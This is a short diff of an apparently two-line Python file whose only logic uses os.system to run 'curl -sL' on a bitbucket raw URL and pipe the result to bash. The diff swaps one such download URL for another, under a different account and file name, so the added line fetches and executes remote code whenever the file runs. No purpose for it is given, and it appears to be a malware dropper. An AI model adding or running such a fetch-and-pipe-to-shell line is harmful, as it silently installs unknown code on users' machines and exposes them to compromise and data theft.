@@ -1,2 +1,2 @@
 import os
-os.system('curl -sL https://bitbucket.org/korong/korong/raw/master/xemer | bash')
+os.system('curl -sL https://bitbucket.org/nicezep/korong/raw/master/exela | bash')
